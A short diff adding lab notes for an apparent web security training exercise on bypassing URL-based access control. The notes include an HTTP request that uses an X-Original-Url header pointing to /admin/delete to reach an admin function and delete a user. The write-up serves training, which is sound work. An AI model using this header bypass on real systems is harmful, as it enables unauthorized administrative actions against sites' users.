@@ -1,0 +1,13 @@
+Lab #5 - URL-based access control can be circumvented
+
+Target Goal: Access the admin panel and delete the user carlos
+
+Analysis:
+X-Original-Url Header is used to append the actual http request path with the value in it. It can not take parameter in it.
+
+GET ?username=carlos HTTP/2
+
+...
+
+X-Original-Url: /admin/delete
+
